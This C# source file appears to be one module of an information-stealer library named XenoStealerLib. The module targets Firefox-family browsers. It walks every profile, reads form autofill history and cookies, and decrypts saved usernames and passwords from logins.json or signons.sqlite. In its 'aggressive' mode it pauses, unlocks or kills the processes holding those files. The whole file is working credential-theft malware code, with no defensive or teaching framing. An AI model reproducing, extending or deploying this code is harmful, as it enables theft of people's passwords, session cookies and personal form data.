using XenoStealerLib.Utils;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.IO.Pipes;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Web.Script.Serialization;
using static XenoStealerLib.Chromium;

namespace XenoStealerLib
{
    class Gecko
    {

        private bool Aggresive = false;


        public Gecko(bool Aggresive=false) 
        {
            this.Aggresive = Aggresive;
        }

        public GeckoData GetImportant() 
        {
            List<AutoFillHolder> autofillList = new List<AutoFillHolder>();
            List<LoginHolder> loginList = new List<LoginHolder>();
            List<CookieHolder> cookieList = new List<CookieHolder>();
            foreach (var browser in Internal_Settings.GeckoBrowsers)
            {
                string ProfilesPath = browser.Value;
                if (!Internal_Settings.GeckoLibraryPaths.ContainsKey(browser.Key))
                {
                    continue;
                }
                string ResourcePath = Internal_Settings.GeckoLibraryPaths[browser.Key];
                string BrowserName = browser.Key;
                bool Get_logins = FireFoxDecryptor.IsValidGeckoResourcePath(ResourcePath);
                if (!Directory.Exists(ProfilesPath)) continue;
                FireFoxDecryptor decryptor=null;
                if (Get_logins)
                {
                    decryptor = new FireFoxDecryptor(ResourcePath);
                    Get_logins = decryptor.Worked;
                }
                
                foreach (string profile in Directory.GetDirectories(ProfilesPath))
                {
                    string profileName = new DirectoryInfo(profile).Name;
                    List<AutoFill> autofillData = null;
                    List<Cookie> cookieData = null;
                    List<Login> logins = null;
                    try
                    {
                        autofillData = GetAutoFill(profile);
                    }
                    catch { }
                    try
                    {
                        cookieData = GetCookies(profile);
                    }
                    catch { }

                    if (Get_logins)
                    {
                        try
                        {
                            logins = GetLogins(profile, ResourcePath, decryptor);
                        }
                        catch { }
                    }
                    if (autofillData != null) autofillList.Add(new AutoFillHolder(autofillData, BrowserName, profileName));
                    if (cookieData != null) cookieList.Add(new CookieHolder(cookieData, BrowserName, profileName));
                    if (logins != null) loginList.Add(new LoginHolder(logins, BrowserName, profileName));
                    
                }
                if (decryptor != null) 
                {
                    decryptor.Dispose();
                }
            }
            return new GeckoData(autofillList, loginList, cookieList);
        }

        public List<AutoFillHolder> GetAutoFill()
        {
            List<AutoFillHolder> autofillList = new List<AutoFillHolder>();
            foreach (var browser in Internal_Settings.GeckoBrowsers)
            {
                string ProfilesPath = browser.Value;
                if (!Internal_Settings.GeckoLibraryPaths.ContainsKey(browser.Key))
                {
                    continue;
                }
                string ResourcePath = Internal_Settings.GeckoLibraryPaths[browser.Key];
                string BrowserName = browser.Key;
                if (!Directory.Exists(ProfilesPath)) continue;

                foreach (string profile in Directory.GetDirectories(ProfilesPath))
                {
                    List<AutoFill> autofillData = GetAutoFill(profile);
                    if (autofillData != null) autofillList.Add(new AutoFillHolder(autofillData, BrowserName, new DirectoryInfo(profile).Name));
                }

            }
            return autofillList;
        }

        public List<AutoFill> GetAutoFill(string profile)
        {
            List<AutoFill> Autofills = new List<AutoFill>();
            string db_location = Path.Combine(profile, "formhistory.sqlite");
            if (!File.Exists(db_location)) return null;
            SqlHandler conn = new SqlHandler(db_location, Aggresive);
            if (!conn.ReadTable("moz_formhistory"))
            {
                return null;
            }

            for (int i = 0; i < conn.GetRowCount(); i++)
            {
                string name = conn.GetValue(i, "fieldname");
                string value = conn.GetValue(i, "value");
                if (name == null || value == null) continue;
                AutoFill newAutoFill = new AutoFill(name, value);
                Autofills.Add(newAutoFill);
            }
            return Autofills;
        }

        public List<LoginHolder> GetLogins() 
        {
            List<LoginHolder> loginList = new List<LoginHolder>();
            foreach (var browser in Internal_Settings.GeckoBrowsers)
            {
                string ProfilesPath = browser.Value;
                if (!Internal_Settings.GeckoLibraryPaths.ContainsKey(browser.Key)) 
                {
                    continue;
                }
                string ResourcePath = Internal_Settings.GeckoLibraryPaths[browser.Key];
                string BrowserName = browser.Key;
                if (!Directory.Exists(ProfilesPath) || !Directory.Exists(ResourcePath)) continue;

                foreach (string profile in Directory.GetDirectories(ProfilesPath))
                {
                    List<Login> logins = GetLogins(profile, ResourcePath);
                    if (logins == null) continue;
                    loginList.Add(new LoginHolder(logins, BrowserName, new DirectoryInfo(profile).Name));
                }

            }
            return loginList;
        }

        private string ReadFileStringAggresive(string filepath)
        {
            string data = null;
            try
            {
                data = File.ReadAllText(filepath);
            }
            catch (Exception e)
            {
                if (Aggresive)
                {
                    List<int> ListOfPidsLockingFile = FileLockInfo.GetProcessesIdsLockingFile(filepath);
                    List<int> FrozenPids = new List<int>();
                    foreach (int pid in ListOfPidsLockingFile)
                    {
                        int ParentPid = ParentProcessUtil.GetParentProcessId(pid);
                        if (ParentPid == 0)
                        {
                            ParentPid = pid;
                        }
                        if (SimpleProcessStuff.GetProcessName(ParentPid).ToLower() != "explorer")
                        {
                            ProcessPauser.Pause(ParentPid);
                            FrozenPids.Add(ParentPid);
                        }
                        FileLockBypasser.CloseFileHandlesFromPid(pid, filepath);
                    }
                    bool worked = true;
                    try
                    {
                        data = File.ReadAllText(filepath);
                    }
                    catch
                    {
                        worked = false;
                    }
                    foreach (int frozen_pid in FrozenPids)
                    {
                        ProcessPauser.Resume(frozen_pid);
                    }
                    foreach (int pid in ListOfPidsLockingFile)
                    {
                        int ParentPid = ParentProcessUtil.GetParentProcessId(pid);
                        if (ParentPid == 0)
                        {
                            ParentPid = pid;
                        }
                        if (!worked)
                        {
                            SimpleProcessStuff.Kill(ParentPid);
                        }
                    }
                    if (!worked)
                    {
                        data = File.ReadAllText(filepath);
                    }
                }
                else
                {
                    throw e;
                }
            }
            return data;
        }

        public List<Login> GetLogins(string profilePath, string ResourcePath=null, FireFoxDecryptor decryptor=null)
        {
            string signonsPath = Path.Combine(profilePath, "signons.sqlite");
            string loginsPath = Path.Combine(profilePath, "logins.json");
            bool is_signon = File.Exists(signonsPath);
            bool do_decryptor_dispose = true;
            if (!(is_signon || File.Exists(loginsPath)) || !(ResourcePath==null || FireFoxDecryptor.IsValidGeckoResourcePath(ResourcePath))) return null;
            if (decryptor == null)
            {
                if (ResourcePath == null)
                {
                    return null;
                }
                decryptor = new FireFoxDecryptor(ResourcePath);
            }
            else 
            {
                do_decryptor_dispose = false;
            }   
            if (!decryptor.Worked || !decryptor.SetProfilePath(profilePath)) return null;

            List<Login> logins = new List<Login>();

            if (is_signon && new System.IO.FileInfo(signonsPath).Length>100)
            {
                SqlHandler conn = new SqlHandler(signonsPath, Aggresive);
                if (!conn.ReadTable("moz_logins"))
                {
                    decryptor.Dispose();
                    return null;
                }
                for (int i = 0; i < conn.GetRowCount(); i++)
                {
                    string hostname = conn.GetValue(i, "hostname");
                    string encryptedUsername = conn.GetValue(i, "encryptedUsername");
                    string encryptedPassword = conn.GetValue(i, "encryptedPassword");
                    string username = decryptor.Decrypt(encryptedUsername);
                    string password = decryptor.Decrypt(encryptedPassword);
                    if (hostname == null || username == null || password == null) continue;
                    logins.Add(new Login(hostname, username, password));
                }
            }
            else 
            {
                string loginData= ReadFileStringAggresive(loginsPath);
                JavaScriptSerializer serializer = new JavaScriptSerializer();
                dynamic jsonObject = serializer.Deserialize<dynamic>(loginData);
                if (jsonObject != null && jsonObject.ContainsKey("logins")) 
                {
                    dynamic[] json_logins = jsonObject["logins"];
                    foreach (dynamic login in json_logins) 
                    {
                        if (login != null && login.ContainsKey("hostname") && login.ContainsKey("encryptedUsername") && login.ContainsKey("encryptedPassword")) 
                        {
                            string hostname = (string)login["hostname"];
                            string encryptedUsername = (string)login["encryptedUsername"];
                            string encryptedPassword = (string)login["encryptedPassword"];
                            string username = decryptor.Decrypt(encryptedUsername);
                            string password = decryptor.Decrypt(encryptedPassword);
                            if (hostname==null||username == null || password == null) continue;
                            logins.Add(new Login(hostname, username, password));
                        }
                    }
                }
            }
            if (do_decryptor_dispose) 
            {
                decryptor.Dispose();
            } 
            return logins;
        }

        public List<CookieHolder> GetCookies() 
        {
            List<CookieHolder> cookieList = new List<CookieHolder>();
            foreach (var browser in Internal_Settings.GeckoBrowsers)
            {
                string ProfilesPath = browser.Value;
                if (!Internal_Settings.GeckoLibraryPaths.ContainsKey(browser.Key))
                {
                    continue;
                }
                string ResourcePath = Internal_Settings.GeckoLibraryPaths[browser.Key];
                string BrowserName = browser.Key;
                if (!Directory.Exists(ProfilesPath)) continue;

                foreach (string profile in Directory.GetDirectories(ProfilesPath))
                {
                    List<Cookie> cookieData = GetCookies(profile);
                    if (cookieData!=null) cookieList.Add(new CookieHolder(cookieData, BrowserName, new DirectoryInfo(profile).Name));
                }

            }
            return cookieList;
        }

        public List<Cookie> GetCookies(string profile) 
        {
            List<Cookie> Cookies = new List<Cookie>();
            string db_location = Path.Combine(profile, "cookies.sqlite");
            if (!File.Exists(db_location)) return null;
            SqlHandler conn = new SqlHandler(db_location, Aggresive);
            if (!conn.ReadTable("moz_cookies"))
            {
                return null;
            }

            for (int i = 0; i < conn.GetRowCount(); i++)
            {
                string host = conn.GetValue(i, "host");
                string name = conn.GetValue(i, "name");
                string url_path = conn.GetValue(i, "path");
                string cookie = conn.GetValue(i, "value");
                string expires_string = conn.GetValue(i, "expiry");
                if (host == null || name == null || url_path == null || cookie == null || expires_string == null || expires_string == "") continue;
                long exipry = long.Parse(expires_string);
                Cookie newCookies = new Cookie(host, name, url_path, cookie, exipry);
                Cookies.Add(newCookies);
            }
            return Cookies;
        }

        public class GeckoData 
        {
            public List<AutoFillHolder> AutoFills;
            public List<LoginHolder> Logins;
            public List<CookieHolder> Cookies;
            public GeckoData(List<AutoFillHolder> AutoFills, List<LoginHolder> Logins, List<CookieHolder> Cookies)
            {
                this.AutoFills = AutoFills;
                this.Logins = Logins;
                this.Cookies = Cookies;
            }
        }

        public class AutoFillHolder
        {
            public List<AutoFill> autofills;
            public string browser;
            public string profile;
            public AutoFillHolder(List<AutoFill> autofills, string browser, string profile)
            {
                this.autofills = autofills;
                this.browser = browser;
                this.profile = profile;
            }
        }

        public class AutoFill
        {
            public AutoFill(string name, string value)
            {
                this.name = name;
                this.value = value;
            }

            public string name { get; set; }
            public string value { get; set; }
        }

        public class CookieHolder
        {
            public List<Cookie> cookies;
            public string browser;
            public string profile;
            public CookieHolder(List<Cookie> cookies, string browser, string profile)
            {
                this.cookies = cookies;
                this.browser = browser;
                this.profile = profile;
            }
        }

        public class Cookie
        {
            public Cookie(string host, string name, string path, string value, long expires)
            {
                this.host = host;
                this.name = name;
                this.path = path;
                this.value = value;
                const long minUnixTimestamp = 0; // Minimum valid Unix timestamp (January 1, 1970)
                const long maxUnixTimestamp = 2147483647; // Maximum valid Unix timestamp (January 19, 2038)
                if (expires > maxUnixTimestamp || expires < minUnixTimestamp)
                {
                    expires = maxUnixTimestamp - 1;
                }
                this.expires = expires;
            }

            public string host { get; set; }
            public string name { get; set; }
            public string path { get; set; }
            public string value { get; set; }
            public long expires { get; set; }
        }

        public class LoginHolder
        {
            public List<Login> logins;
            public string browser;
            public string profile;
            public LoginHolder(List<Login> logins, string browser, string profile)
            {
                this.logins = logins;
                this.browser = browser;
                this.profile = profile;
            }
        }

        public class Login
        {
            public Login(string url, string username, string password)
            {
                this.url = url;
                this.username = username;
                this.password = password;
            }

            public string url { get; set; }
            public string username { get; set; }
            public string password { get; set; }
        }

    }
}
